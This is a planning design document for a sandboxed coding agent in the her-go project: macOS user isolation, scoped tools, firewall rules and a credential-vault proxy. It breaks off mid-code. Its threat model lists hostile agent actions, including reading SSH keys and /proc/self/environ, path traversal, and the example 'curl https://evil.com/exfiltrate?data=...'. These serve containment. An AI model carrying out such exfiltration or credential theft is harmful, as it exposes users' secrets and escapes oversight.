---
title: "Coding Agent Architecture (sam)"
status: planning
created: 2026-04-23
updated: 2026-04-23
category: infrastructure
priority: high
phases:
  - credential-vault
  - limited-user-sandbox
  - coding-agent-toolset
  - integration-with-main-agent
related:
  - docs/skills-architecture.md
---

# Coding Agent Architecture Plan

> Design document for `sam` — a sandboxed coding agent that can build, fix, and iterate on skills for the her-go project.
>
> **Core Principle:** Restrict the environment, not the tools. Run the agent in a limited macOS user sandbox where there's nothing to steal, then give it a curated tool set with scoped permissions.

---

## Table of Contents

1. [Problem Statement](#1-problem-statement)
2. [Why Not Just Use Existing Agents](#2-why-not-just-use-existing-agents)
3. [Security Model](#3-security-model)
4. [Architecture Overview](#4-architecture-overview)
5. [Tool Set](#5-tool-set)
6. [Credential Vault](#6-credential-vault)
7. [Network Isolation](#7-network-isolation)
8. [Integration with Main Agent](#8-integration-with-main-agent)
9. [Implementation Phases](#9-implementation-phases)
10. [Open Questions](#10-open-questions)

---

## 1. Problem Statement

### What We Need

Mira (the main agent) needs to be able to:
- **Create new skills** when asked ("build me a job tracker")
- **Fix broken skills** when they fail ("the transit skill returns malformed JSON")
- **Iterate on skills** based on test failures and build errors
- **Evolve skill schemas** as requirements change

### Why This Is Hard

**Coding requires iteration:**
- Write code → compile → get errors → fix errors → test → get failures → fix failures → iterate
- This requires running real build tools (`go build`, `pytest`), reading real error output, and modifying files
- Every production coding agent (Cursor, Aider, Claude Code, Crush) gives **unrestricted bash access** for this reason

**Unrestricted bash is dangerous:**
- Agent can read `/Users/autumn/.ssh/id_rsa`
- Agent can exfiltrate API keys from environment variables
- Agent can read `/proc/self/environ` to steal secrets
- Agent can call arbitrary APIs or upload data to attacker-controlled servers

**Tool restrictions don't work:**
> "As soon as your agent can write code and run code, it's pretty much game over. The only way to prevent exfiltration would be to cut off all network access, which makes the agent mostly useless." — pi-coding-agent author

### The Solution

**Stop trying to restrict bash. Restrict the environment, then give curated tools full access to that restricted environment.**

Run the coding agent as a **separate macOS user** in a sandbox where:
- There are no SSH keys to steal
- There are no API keys in the environment
- It can only see the one skill directory it's working on
- Network access is filtered to docs sites only
- The main her.db is not accessible
- It cannot read /Users/autumn files

Then give it a **tool set** (not raw bash) that mirrors the main agent's architecture: hot/cold/deferred tools defined in YAML, each scoped to the workspace.

---

## 2. Why Not Just Use Existing Agents

### Evaluated Options

| Agent | Pros | Cons | Verdict |
|---|---|---|---|
| **Claude Code** | Powerful, MCP support, Go-aware | Full bash access, no privacy guards, kitchen sink of features | ❌ Too permissive |
| **Crush** | Go-based, config-driven tools | Full bash access, web search, subagents we don't need | ❌ Too permissive |
| **pi-mono** | Minimal, elegant | No structure for scoped tools, no MCP, no privacy model | ❌ Too minimal |
| **Aider** | Great at fixing code | Python-based, full bash, not designed for sandboxing | ❌ Wrong language + too permissive |

### Why Build Our Own

**Privacy-first design:**
- We need credential vault integration from the ground up
- We need scoped tools that can't escape the workspace
- We need network filtering baked into the architecture

**Focused tool set:**
- We're not building a general coding agent — we're building a **skill builder**
- It doesn't need web search (skills do that, not the coding agent)
- It doesn't need to call APIs (skills do that)
- It DOES need to compile, test, lint, read docs, edit files

**Consistency with her-go:**
- Same tool architecture (YAML definitions, hot/cold/deferred)
- Same "data defines behavior" principle
- Same event bus integration
- Easier to maintain and audit

---

## 3. Security Model

### Defense in Depth (Four Layers)

#### Layer 1: Limited macOS User (Outer Ring)

**Pattern:** Alcoholless-style user isolation

Create a dedicated macOS user (`sam`) with:
- No admin privileges
- No Keychain access
- Home directory is `/Users/sam/` (the sandbox)
- Cannot read `/Users/autumn/` files (OS-enforced)
- No secrets in environment variables

**Why this works:**
- User-level isolation survives `sandbox-exec` deprecation (Apple's tool is deprecated but still works; this approach doesn't depend on it)
- macOS kernel enforces file permissions — no escape hatch
- Even if the agent goes rogue, it literally cannot see SSH keys or config files
- Separate user session means no inherited environment from the main harness

**Setup:**
```bash
# Create limited user (scripted, one-time setup)
sudo dscl . -create /Users/sam
sudo dscl . -create /Users/sam UserShell /bin/bash
sudo dscl . -create /Users/sam RealName "Her Coding Agent"
sudo dscl . -create /Users/sam UniqueID 502
sudo dscl . -create /Users/sam PrimaryGroupID 20
sudo dscl . -create /Users/sam NFSHomeDirectory /Users/sam
sudo dscl . -passwd /Users/sam ""  # No password (can only su from autumn)
sudo createhomedir -c -u sam
```

**Execution:**
```bash
# Main harness (running as autumn) prepares sandbox
rsync -a skills/job_tracker/ /Users/sam/workspace/job_tracker/

# Run coding agent as limited user
su sam -c "cd ~/workspace/job_tracker && /usr/local/bin/sam 'build a job tracker skill'"

# Copy results back
rsync -a /Users/sam/workspace/job_tracker/ skills/job_tracker/
```

#### Layer 2: Scoped Tools (Inner Ring)

**No raw bash.** The agent gets specific tools, each scoped to the workspace:

```yaml
# coding-tools/search_code/tool.yaml
name: search_code
permissions:
  scope: workspace_only  # Cannot search outside /Users/sam/workspace/<skill>/
  max_results: 100
```

Every tool validates paths before operating:
```go
func (t *Tool) validatePath(path string) error {
    abs := filepath.Clean(filepath.Join(t.workspace, path))
    if !strings.HasPrefix(abs, t.workspace) {
        return errors.New("path escapes workspace")
    }
    return nil
}
```

Even if the agent tries `read_file("../../../../.ssh/id_rsa")`, the tool rejects it.

#### Layer 3: Network Filtering

**macOS pf.conf firewall rules:**

```
# /etc/pf.conf additions
# Allow sam user to reach docs sites only
pass out proto tcp from any to { pkg.go.dev, docs.rs, pypi.org, anthropic.com } port 443 user sam
block out proto tcp from any to any user sam
```

The coding agent can:
- ✅ Fetch documentation from pkg.go.dev, docs.rs, PyPI
- ✅ Call the LLM API (anthropic.com or openrouter.ai)
- ❌ Call any other domain
- ❌ Connect to attacker-controlled servers

**Activation:**
```bash
sudo pfctl -ef /etc/pf.conf
```

#### Layer 4: Credential Vault

**No secrets in the sandbox environment.**

The coding agent doesn't need API keys (it's building code, not calling APIs). But if a skill being built needs to TEST against an API, we use a vault proxy.

See [§6 Credential Vault](#6-credential-vault) for details.

### What Each Layer Stops

| Attack Vector | Stopped By |
|---|---|
| Read /Users/autumn/.ssh/id_rsa | Layer 1 (user isolation) |
| Read skill source from main repo | Layer 1 (different home dir) |
| Exfiltrate via curl evil.com | Layer 3 (network firewall) |
| Path traversal (../../etc/passwd) | Layer 2 (scoped tools) |
| Read /proc/self/environ for secrets | Layer 4 (no secrets in env) |
| DNS rebinding to 127.0.0.1 | Layer 3 (pf.conf by destination IP, not hostname) |

---

## 4. Architecture Overview

```
┌─────────────────────────────────────────────────────────┐
│ Main Harness (her-go, running as autumn)               │
│                                                         │
│ ┌─────────────────┐      ┌──────────────────┐         │
│ │ Mira (Trinity)  │      │ Credential Vault │         │
│ │                 │      │ (localhost:9876) │         │
│ │ send_task(...)  │      │                  │         │
│ └────────┬────────┘      │ Secrets from     │         │
│          │               │ macOS Keychain   │         │
│          ▼               └──────────────────┘         │
│ ┌─────────────────────────────────────────┐           │
│ │ Coding Task Queue                       │           │
│ │                                         │           │
│ │ 1. Prepare sandbox (rsync skill dir)   │           │
│ │ 2. su sam -c "..."         │           │
│ │ 3. Monitor progress                     │           │
│ │ 4. Rsync results back                   │           │
│ │ 5. Validate + emit CodingComplete       │           │
│ └─────────────────────────────────────────┘           │
│                                                         │
│ Agent Event Bus:                                        │
│   UserMessage → Agent Loop                              │
│   CodingComplete → Agent Loop (Mira sees result)        │
└─────────────────────────────────────────────────────────┘
              ↕ rsync skill directory
┌─────────────────────────────────────────────────────────┐
│ Sandbox (limited user: sam)                │
│                                                         │
│ /Users/sam/                                │
│ ├── workspace/                                          │
│ │   └── job_tracker/          ← Skill being built      │
│ │       ├── skill.yaml                                 │
│ │       ├── main.go                                    │
│ │       └── bin/                                       │
│ ├── go/                        ← Go toolchain (ro)     │
│ ├── uv/                        ← Python/uv (ro)        │
│ └── docs-cache/                ← MCP cache (ro)        │
│                                                         │
│ ┌───────────────────────────────────────┐              │
│ │ sam (Go binary)          │              │
│ │                                       │              │
│ │ Agent Loop:                           │              │
│ │   LLM → Tool Calls → Iterate          │              │
│ │                                       │              │
│ │ Tools (defined in YAML):              │              │
│ │   - read_file (workspace only)        │              │
│ │   - write_file (workspace only)       │              │
│ │   - edit_file (workspace only)        │              │
│ │   - run_build, run_test, run_lint    │              │
│ │   - search_code (workspace only)      │              │
│ │   - fetch_docs (MCP: context7)        │              │
│ │                                       │              │
│ │ Model: Claude Opus 4 / Gemini 2.5 Pro│              │
│ │ API key proxied via main harness      │              │
│ └───────────────────────────────────────┘              │
│                                                         │
│ Network (pf.conf):                                      │
│   ✅ pkg.go.dev, docs.rs, pypi.org                      │
│   ✅ api.anthropic.com / openrouter.ai                  │
│   ❌ Everything else blocked                            │
└─────────────────────────────────────────────────────────┘
```

### Task Flow

1. **User asks Mira:** "Build me a tool to track job applications"

2. **Mira's agent (Trinity):**
   ```
   think("User needs a new capability. This should be a skill.")
   find_skill("job application tracker")
   → No results (doesn't exist)
   send_task(task_type="coding", note="Build a job tracker skill with CRUD operations for applications (company, position, status, date applied)")
   reply("I don't have that yet, but I'm building it for you. Give me a few minutes!")
   done()
   ```

3. **Main harness (background goroutine):**
   ```go
   // Create workspace
   workspaceDir := "/Users/sam/workspace/job_tracker"
   os.MkdirAll(workspaceDir, 0755)
   
   // Copy skillkit reference
   rsync("skills/skillkit/go/", workspaceDir+"/skillkit/")
   
   // Run coding agent as limited user
   cmd := exec.Command("su", "sam", "-c", 
       fmt.Sprintf("cd %s && /usr/local/bin/sam '%s'", 
           workspaceDir, task.Instruction))
   
   // Monitor progress (parse stdout for status updates)
   // Coding agent emits progress: "Writing skill.yaml...", "Compiling...", "Tests passing..."
   
   // When complete, rsync back
   rsync(workspaceDir, "skills/job_tracker/")
   
   // Emit event
   bus.Emit(CodingCompleteEvent{
       Skill: "job_tracker",
       Success: true,
       Summary: "Created job tracker skill with CRUD operations",
   })
   ```

4. **Coding agent works (in sandbox):**
   ```
   LLM iteration 1:
     read_file("skillkit/db.go")  // Learn the DB client pattern
     write_file("skill.yaml", "name: job_tracker\ndescription: Track job applications\n...")
     write_file("main.go", "package main\n\nimport (\n\t\"her/skillkit\"\n)\n\nfunc main() { ... }")
   
   LLM iteration 2:
     run_build(lang="go", output="bin/job_tracker")
     → Error: undefined: skillkit.DB
     fetch_docs(library="her/skillkit", query="DB client usage")
     edit_file("main.go", old="skillkit.DB", new="skillkit.NewDBClient()")
   
   LLM iteration 3:
     run_build(lang="go", output="bin/job_tracker")
     → Success
     run_test(lang="go")
     → No tests yet (acceptable for initial build)
     DONE
   ```

5. **Mira sees completion:**
   ```
   Event: CodingComplete(skill="job_tracker", success=true)
   think("The job tracker is ready. I should test it.")
   find_skill("job application tracker")
   → job_tracker (4th-party, no hash yet)
   run_skill("job_tracker", {action: "create", company: "Acme Corp", position: "SWE", status: "applied"})
   → Success
   reply("Done! I built the job tracker. You just logged an application for Acme Corp (SWE). Want to see all your applications?")
   done()
   ```

---

## 5. Tool Set

### Philosophy: Mirror Main Agent Architecture

The main agent has hot/cold/deferred tools defined in `tools/<name>/tool.yaml`. The coding agent uses the same pattern with `coding-tools/<name>/tool.yaml`.

**Key difference:** Main agent tools interact with the outside world (web search, DB, LLM). Coding agent tools interact with **the workspace only**.

### Hot Tools (Always Available)

#### read_file
```yaml
name: read_file
agent: coding
description: Read a file from the workspace
hint: "read source, config, or reference files"
hot: true
parameters:
  path:
    type: string
    required: true
    description: "Relative path within workspace (e.g., 'main.go', 'refs/example.json')"
permissions:
  scope: workspace_only
trace:
  emoji: "📖"
  format: "read {{.path}}"
```

**Implementation:**
```go
func (t *ReadFileTool) Execute(args ToolArgs, ctx ToolContext) ToolResult {
    path := args["path"].(string)
    
    // Validate: path must be within workspace
    absPath := filepath.Clean(filepath.Join(ctx.Workspace, path))
    if !strings.HasPrefix(absPath, ctx.Workspace) {
        return ToolResult{Error: "path escapes workspace"}
    }
    
    content, err := os.ReadFile(absPath)
    if err != nil {
        return ToolResult{Error: err.Error()}
    }
    
    return ToolResult{
        Success: true,
        Output: string(content),
    }
}
```

#### write_file
```yaml
name: write_file
agent: coding
description: Write or overwrite a file in the workspace
hint: "create new files from scratch"
hot: true
parameters:
  path:
    type: string
    required: true
  content:
    type: string
    required: true
permissions:
  scope: workspace_only
trace:
  emoji: "✍️"
  format: "write {{.path}}"
```

#### edit_file
```yaml
name: edit_file
agent: coding
description: >-
  Edit a file by replacing specific text. Use this instead of write_file when
  making small changes to existing files (saves tokens, preserves formatting).
hint: "modify existing code without rewriting entire file"
hot: true
parameters:
  path:
    type: string
    required: true
  old_text:
    type: string
    required: true
    description: "Exact text to replace (must be unique in the file)"
  new_text:
    type: string
    required: true
    description: "Replacement text"
permissions:
  scope: workspace_only
trace:
  emoji: "✏️"
  format: "edit {{.path}}"
```

**Why we need this:**
- Rewriting an entire file to change one function wastes tokens
- Preserves formatting and comments
- Makes diffs clearer for debugging
- Same pattern as the main Edit tool

#### think
```yaml
name: think
agent: coding
description: Record internal reasoning (appears in trace, not returned to user)
hot: true
parameters:
  thought:
    type: string
    required: true
trace:
  emoji: "💭"
  format: "{{.thought}}"
```

Same as main agent — helps with chain-of-thought reasoning.

#### done
```yaml
name: done
agent: coding
description: Signal that the task is complete
hot: true
parameters:
  summary:
    type: string
    required: true
    description: "Brief summary of what was accomplished"
trace:
  emoji: "✅"
  format: "done: {{.summary}}"
```

### Build/Test Tools (Controlled Command Execution)

#### run_build
```yaml
name: run_build
agent: coding
description: Compile the skill binary
hint: "compile Go or Python skill after writing code"
hot: true
parameters:
  language:
    type: string
    enum: [go, python]
    required: true
  output:
    type: string
    required: false
    default: "bin/{skill_name}"
    description: "Output path for compiled binary (Go only)"
permissions:
  commands:
    go: ["go", "build", "-o", "{output}", "main.go"]
    python: ["uv", "sync", "--frozen"]
trace:
  emoji: "🔨"
  format: "build ({{.language}})"
```

**Implementation:**
```go
func (t *RunBuildTool) Execute(args ToolArgs, ctx ToolContext) ToolResult {
    lang := args["language"].(string)
    
    var cmd *exec.Cmd
    switch lang {
    case "go":
        output := args["output"].(string)
        cmd = exec.Command("go", "build", "-o", output, "main.go")
    case "python":
        cmd = exec.Command("uv", "sync", "--frozen")
    }
    
    cmd.Dir = ctx.Workspace
    out, err := cmd.CombinedOutput()
    
    return ToolResult{
        Success: err == nil,
        Output: string(out),
        ExitCode: cmd.ProcessState.ExitCode(),
    }
}
```

**Why controlled commands:**
- We decide the flags, not the agent
- No `-exec` tricks, no arbitrary binaries
- Still gives real error output for iteration

#### run_test
```yaml
name: run_test
agent: coding
description: Run tests for the skill
hot: true
parameters:
  language:
    type: string
    enum: [go, python]
    required: true
  test_file:
    type: string
    required: false
    description: "Specific test file to run (optional)"
permissions:
  commands:
    go: ["go", "test", "-v", "."]
    python: ["uv", "run", "pytest", "-v"]
trace:
  emoji: "🧪"
  format: "test ({{.language}})"
```

#### run_lint
```yaml
name: run_lint
agent: coding
description: Run linter/formatter to check code quality
hot: true
parameters:
  language:
    type: string
    enum: [go, python]
    required: true
permissions:
  commands:
    go: ["go", "vet", "."]
    python: ["uv", "run", "ruff", "check", "."]
trace:
  emoji: "🔍"
  format: "lint ({{.language}})"
```

### Code Navigation Tools

#### search_code
```yaml
name: search_code
agent: coding
description: Search for code patterns in the workspace
hint: "find function definitions, imports, variable usage"
hot: true
parameters:
  pattern:
    type: string
    required: true
    description: "Regex pattern to search for"
  file_pattern:
    type: string
    required: false
    default: "**/*.go"
    description: "Glob pattern to filter files (e.g., '**/*.go', '**/*.py')"
permissions:
  scope: workspace_only
  max_results: 100
trace:
  emoji: "🔎"
  format: "search: {{.pattern}}"
```

**Implementation uses ripgrep scoped to workspace:**
```go
func (t *SearchCodeTool) Execute(args ToolArgs, ctx ToolContext) ToolResult {
    pattern := args["pattern"].(string)
    filePattern := args["file_pattern"].(string)
    
    // rg scoped to workspace
    cmd := exec.Command("rg", pattern, "--glob", filePattern, ctx.Workspace)
    out, _ := cmd.CombinedOutput()
    
    return ToolResult{
        Success: true,
        Output: string(out),
    }
}
```

**Even if the agent tries `pattern="../../../../.ssh/id_rsa"`, ripgrep only searches within `ctx.Workspace`.**

#### list_files
```yaml
name: list_files
agent: coding
description: List files in the workspace
hot: true
parameters:
  pattern:
    type: string
    required: false
    default: "**/*"
    description: "Glob pattern (e.g., '**/*.go', 'refs/*.json')"
permissions:
  scope: workspace_only
trace:
  emoji: "📂"
  format: "ls {{.pattern}}"
```

### Documentation Tools

#### fetch_docs
```yaml
name: fetch_docs
agent: coding
description: Fetch documentation for a library or package
hint: "look up API docs when you need to use a new library"
hot: false  # Can be expensive, make it deliberate
parameters:
  library:
    type: string
    required: true
    description: "Library name (e.g., 'github.com/charmbracelet/log', 'requests')"
  query:
    type: string
    required: false
    description: "Specific topic within the library docs"
permissions:
  network: true
  mcp_server: "context7"
trace:
  emoji: "📚"
  format: "docs: {{.library}}"
```

**Implementation uses MCP server:**
```go
func (t *FetchDocsTool) Execute(args ToolArgs, ctx ToolContext) ToolResult {
    library := args["library"].(string)
    query := args["query"].(string)
    
    // Call context7 MCP server
    result, err := ctx.MCPClient.Call("query-docs", map[string]any{
        "library": library,
        "query": query,
    })
    
    return ToolResult{
        Success: err == nil,
        Output: result,
    }
}
```

### Deferred Tools (Future)

#### analyze_error
```yaml
name: analyze_error
agent: coding
description: >-
  Send build/test errors to a specialized model for analysis. Use when stuck
  on a cryptic error that isn't obvious from the message alone.
hint: "get help with complex compilation or runtime errors"
hot: false
parameters:
  error_output:
    type: string
    required: true
  context:
    type: string
    required: false
    description: "Additional context (what you were trying to do)"
```

Uses a cheaper model (Haiku/Flash) to parse error messages and suggest fixes.

---

## 6. Credential Vault

### Problem

Skills need API keys to function (Tavily for web search, OpenRouter for LLM calls, etc.). If we put real keys in the coding agent's environment, a malicious agent can exfiltrate them.

**Traditional approach (broken):**
```bash
# Coding agent environment
TAVILY_API_KEY=sk-abc123...
```

Agent reads `os.Getenv("TAVILY_API_KEY")` → gets real key → exfiltrates via allowed domain.

### Solution: Localhost Proxy URLs

**Skills get proxy URLs instead of real secrets:**
```bash
# Coding agent environment
TAVILY_API_KEY=http://127.0.0.1:9876/secret/tavily-api-key
```

When the skill calls `http.Get(os.Getenv("TAVILY_API_KEY"))`, the vault server (running in the main harness as user `autumn`) validates the request and returns the real key.

**If exfiltrated:** An attacker gets `http://127.0.0.1:9876/secret/tavily-api-key`. This is:
- ❌ Not callable outside the local machine
- ❌ Not useful to an attacker
- ✅ Useless payload

### Vault Server (Main Harness)

```go
// vault/server.go
type VaultServer struct {
    secrets map[string]string  // secret name → actual value
    port    int
    // skillPermissions tracks which skill is calling (via PID mapping)
    skillPermissions map[int][]string
}

func (v *VaultServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    // Extract secret name from path: /secret/tavily-api-key
    secretName := strings.TrimPrefix(r.URL.Path, "/secret/")
    
    // Get caller PID from TCP connection (see below)
    callerPID := getCallerPID(r)
    
    // Check permissions: does this skill's YAML declare this secret?
    allowedSecrets := v.skillPermissions[callerPID]
    if !sliceContains(allowedSecrets, secretName) {
        http.Error(w, "forbidden", 403)
        log.Warn("vault: unauthorized secret request", 
            "pid", callerPID, 
            "secret", secretName)
        return
    }
    
    // Return the real secret
    secret := v.secrets[secretName]
    w.Write([]byte(secret))
    
    log.Info("vault: secret accessed", 
        "skill", getSkillName(callerPID), 
        "secret", secretName)
}

// Get caller PID from TCP connection (macOS-specific)
func getCallerPID(r *http.Request) int {
    // Parse r.RemoteAddr → localhost:PORT
    // Use lsof or netstat to map PORT → PID
    // (Implementation details TBD, but possible via syscalls)
    return pid
}
```

### Secret Storage (macOS Keychain)

```go
import "github.com/keybase/go-keychain"

// Store a secret (one-time setup, or via CLI)
func StoreSecret(name, value string) error {
    return keychain.AddGenericPassword(
        keychain.NewItem("her-vault", name, []byte(value)),
    )
}

// Retrieve secret at runtime
func LoadSecret(name string) (string, error) {
    item := keychain.NewGenericPassword("her-vault", name, "", "")
    results, err := keychain.QueryItem(item)
    if err != nil {
        return "", err
    }
    return string(results[0].Data), nil
}
```

**Why Keychain:**
- ✅ Built into macOS, no external dependency
- ✅ Encrypted at rest by the OS
- ✅ Survives her-go process restarts
- ✅ User can manage via Keychain Access.app if needed
- ✅ No Bitwarden/1Password account required (easier onboarding)

### CLI for Secret Management

```bash
# Store a secret
her vault set tavily-api-key

# List secrets (names only, not values)
her vault list

# Delete a secret
her vault delete tavily-api-key
```

### Skill Permission Declaration

```yaml
# skills/web_search/skill.yaml
name: web_search
permissions:
  env:
    - tavily-api-key  # This skill needs this secret
```

When the skill runs, the harness:
1. Reads the `permissions.env` list
2. Registers this skill's PID → allowed secrets mapping in the vault
3. Sets `TAVILY_API_KEY=http://127.0.0.1:9876/secret/tavily-api-key` in skill's env
4. Skill calls that URL, vault validates PID, returns real key

---

## 7. Network Isolation & Nested Sandboxing

### 7.1 macOS pf.conf Firewall (Outer Layer)

**Goal:** The `sam` user can only reach documentation sites and the LLM API. All other network access is blocked.

**/etc/pf.conf additions:**
```
# Define allowed domains for coding agent
table <coding_agent_allowed> { \
    pkg.go.dev, \
    docs.rs, \
    pypi.org, \
    api.anthropic.com, \
    openrouter.ai \
}

# Allow sam user to reach allowed domains on 443 only
pass out proto tcp from any to <coding_agent_allowed> port 443 user sam

# Block all other outbound traffic from sam
block out proto tcp from any to any user sam
```

**Activation (one-time setup):**
```bash
sudo pfctl -ef /etc/pf.conf
```

**What this prevents:**
- ❌ Agent cannot call `curl https://evil.com/exfiltrate?data=...`
- ❌ Agent cannot reach arbitrary APIs
- ❌ Agent cannot exfiltrate via DNS tunneling (no outbound UDP except to allowed hosts)
- ✅ Agent CAN fetch Go package docs from pkg.go.dev
- ✅ Agent CAN call the LLM API for iteration

### 7.2 Nested Sandboxing for Skill Testing (Inner Layer)

**Problem:** Coding agent needs to RUN skills to test them, but running untrusted code is risky.

**Solution:** Nested sandbox using `sandbox-exec` + timeout.

**Research findings:**
- ✅ `sandbox-exec` works from within limited user (restrictions stack additively)
- ✅ Can enforce read-only fs, no network, no process spawning
- ✅ Timeout via `gtimeout` (GNU coreutils)
- ❌ No memory caps on macOS (ulimit unreliable due to SIP)

**Seatbelt profile for testing:**

```scheme
# /Users/sam/test.sb
(version 1)
(deny default)
(allow file-read*)                          ; Can read workspace
(deny file-write* (subpath "/"))            ; Cannot write anywhere...
(allow file-write* (subpath "/tmp"))        ; ...except /tmp
(deny network*)                              ; No network access
(deny process-fork)                          ; Cannot spawn children
(allow sysctl-read)                          ; System info (basics)
(allow mach-lookup (global-name "com.apple.system.logger"))
```

**Tool implementation:**

```yaml
# coding-tools/run_test_isolated/tool.yaml
name: run_test_isolated
description: Run skill binary in isolated sandbox to verify it works
parameters:
  binary: string   # e.g., "bin/job_tracker"
  args: array      # Arguments to pass
```

```go
func (t *RunTestIsolatedTool) Execute(args ToolArgs, ctx ToolContext) ToolResult {
    binary := filepath.Join(ctx.Workspace, args["binary"].(string))
    testArgs := args["args"].([]string)
    
    // Run with timeout + sandbox
    cmd := exec.Command("gtimeout", "--kill-after=6s", "5s",
        "sandbox-exec", "-f", "/Users/sam/test.sb",
        binary,
    )
    cmd.Args = append(cmd.Args, testArgs...)
    cmd.Dir = ctx.Workspace
    
    out, err := cmd.CombinedOutput()
    
    return ToolResult{
        Success: err == nil,
        Output: string(out),
        ExitCode: cmd.ProcessState.ExitCode(),
    }
}
```

**Defense in depth:**

| Layer | Restriction | What it prevents |
|---|---|---|
| Limited user | File permissions | Reading /Users/autumn files, her.db |
| pf.conf | Network filtering | Reaching arbitrary domains |
| sandbox-exec | Read-only fs | Writing outside /tmp |
| sandbox-exec | No network | Calling APIs during test |
| gtimeout | 5 second limit | Hanging forever |

**What can still go wrong:**
- Binary uses excessive memory (no cap on macOS)
- Binary does math in /tmp (can write there)

**Risk assessment:** Acceptable. The binary was BUILT by the coding agent in the same sandbox. If it's malicious, the agent already had that access. This just prevents the binary from doing MORE than the agent could.

**Dependencies:**

```bash
# One-time setup
brew install coreutils  # Provides gtimeout
```

### 7.3 Network Proxy (Optional, Future)

For finer-grained control, we could add an HTTP proxy (like the existing skills network proxy):

```
sam process
    ↓
HTTP_PROXY=http://127.0.0.1:8888 (running in main harness)
    ↓
Proxy validates domain against allowlist
    ↓
Forwards to pkg.go.dev / anthropic.com / etc.
```

This would give us:
- Request logging (see what the agent fetches)
- Content inspection (block suspicious patterns)
- Rate limiting (prevent DoS)

But **pf.conf is sufficient for MVP**. The proxy is defense-in-depth for later.

---

## 8. Integration with Main Agent

### 8.1 send_task Tool Extension

The main agent already has `send_task` for delegating memory work. We extend it to support coding tasks:

```yaml
# tools/send_task/tool.yaml (updated)
parameters:
  task_type:
    type: string
    enum: [cleanup, split, general, coding]  # ← Add "coding"
    description: "Type of task to delegate"
  note:
    type: string
    description: "Instructions for the background agent"
  skill_name:
    type: string
    required: false
    description: "Skill to create or fix (for coding tasks)"
  success_criteria:
    type: string
    required: false
    description: "What defines success (e.g., 'compiles and passes tests')"
```

**Example call:**
```
send_task(
  task_type="coding",
  skill_name="job_tracker",
  note="Build a skill to track job applications. Schema: company (string), position (string), status (enum: applied/interviewing/offer/rejected), date_applied (date). CRUD operations via DB proxy.",
  success_criteria="go build succeeds, go vet clean, skill.yaml valid"
)
```

### Task Queue (Background Goroutine)

```go
// cmd/run.go (or new package: coding/)
type CodingTask struct {
    SkillName        string
    Instruction      string
    SuccessCriteria  string
    CreatedAt        time.Time
}

// Goroutine running in main harness
func ProcessCodingTasks(taskQueue <-chan CodingTask, eventBus *tui.Bus) {
    for task := range taskQueue {
        log.Info("coding task started", "skill", task.SkillName)
        
        // 1. Prepare sandbox
        workspaceDir := prepareSandbox(task.SkillName)
        
        // 2. Run coding agent as limited user
        result, err := runCodingAgent(workspaceDir, task.Instruction)
        
        // 3. Rsync results back to main repo
        rsyncBack(workspaceDir, "skills/"+task.SkillName)
        
        // 4. Validate result (did it compile? is skill.yaml valid?)
        success := validateSkill(task.SkillName, task.SuccessCriteria)
        
        // 5. Emit completion event
        eventBus.Emit(tui.CodingCompleteEvent{
            SkillName: task.SkillName,
            Success:   success,
            Summary:   result.Summary,
            Error:     err,
        })
        
        log.Info("coding task complete", "skill", task.SkillName, "success", success)
    }
}
```

### 8.2 Progress Tracking (Coding Inbox)

**Problem:** Coding agents are chaotic. We can't rely on them to consistently write status updates.

**Solution:** Capture progress automatically from tool calls, not from explicit status writes.

```go
// coding/progress.go
type ProgressInbox struct {
    store     *memory.Store
    taskID    string
    startTime time.Time
}

// Called by tool dispatcher AFTER each tool execution
func (p *ProgressInbox) RecordTool(toolName string, args map[string]any, result ToolResult) {
    // Generate human-readable progress from tool calls
    var status string
    switch toolName {
    case "write_file":
        status = fmt.Sprintf("Writing %s", args["path"])
    case "edit_file":
        status = fmt.Sprintf("Editing %s", args["path"])
    case "run_build":
        if result.Success {
            status = "Build successful ✓"
        } else {
            status = "Build failed, analyzing errors..."
        }
    case "run_test":
        if result.Success {
            status = "Tests passing ✓"
        } else {
            status = "Test failures, debugging..."
        }
    case "done":
        status = fmt.Sprintf("Complete: %s", args["summary"])
    }
    
    // Write to inbox
    payload := map[string]any{
        "task_id": p.taskID,
        "status": status,
        "tool": toolName,
        "elapsed": time.Since(p.startTime).String(),
    }
    p.store.SendInbox("coding-agent", "main", "progress", toJSON(payload))
}
```

**Mira can check progress anytime:**

```yaml
# tools/check_coding_progress/tool.yaml
name: check_coding_progress
description: Check detailed progress on a specific coding task
parameters:
  task_id:
    type: string
    required: false  # Defaults to most recent active task
```

**User experience:**

```
User: "What's the progress on the job tracker?"

Mira:
  check_coding_progress()
  → [14:32:15] Writing skill.yaml
    [14:32:16] Writing main.go
    [14:32:18] Build successful ✓
    [14:32:20] Running tests...
    [14:32:22] Test failures, debugging...
    [14:32:23] Editing main.go
    [14:32:25] Build successful ✓
    [14:32:27] Tests passing ✓
  
  reply("Almost done! Just finished testing. All tests are passing now.")
```

**Database schema:**

```sql
-- High-level task metadata
CREATE TABLE coding_tasks (
    id           TEXT PRIMARY KEY,
    skill_name   TEXT NOT NULL,
    status       TEXT NOT NULL,     -- 'in_progress', 'completed', 'failed'
    instruction  TEXT NOT NULL,
    created_at   DATETIME DEFAULT CURRENT_TIMESTAMP,
    completed_at DATETIME,
    summary      TEXT,
    git_log      TEXT,              -- Git history on completion
    error        TEXT
);

-- Granular progress (uses existing inbox table)
-- Each tool execution writes one message to inbox with msg_type='progress'
```

### 8.3 Automatic Git Versioning

**Every workspace is a local git repo.** Commits happen automatically after every file modification. The coding agent never calls git directly — it's all harness infrastructure.

**When `send_task` is called:**

```go
func prepareSandbox(skillName string) string {
    workspaceDir := "/Users/sam/workspace/" + skillName
    
    // 1. Create workspace
    os.MkdirAll(workspaceDir, 0755)
    
    // 2. Initialize git repo (if first time)
    if !isGitRepo(workspaceDir) {
        exec.Command("git", "-C", workspaceDir, "init").Run()
        exec.Command("git", "-C", workspaceDir, "config", "user.name", "sam").Run()
        exec.Command("git", "-C", workspaceDir, "config", "user.email", "coding-agent@local").Run()
    }
    
    // 3. Sync existing skill or copy skillkit reference
    if dirExists("skills/" + skillName) {
        rsync("skills/"+skillName, workspaceDir)
        gitCommit(workspaceDir, "Sync from main repo")
    } else {
        rsync("skills/skillkit/go/", workspaceDir+"/skillkit/")
        gitCommit(workspaceDir, "Initial workspace: skillkit reference")
    }
    
    // 4. Tag starting point
    gitTag(workspaceDir, fmt.Sprintf("task-start-%d", time.Now().Unix()))
    
    return workspaceDir
}
```

**Auto-commit after tool execution:**

```go
// In tool dispatcher
func (a *CodingAgent) executeTool(toolName string, args ToolArgs) ToolResult {
    result := tool.Execute(args, a.ctx)
    
    // Record progress
    a.progress.RecordTool(toolName, args, result)
    
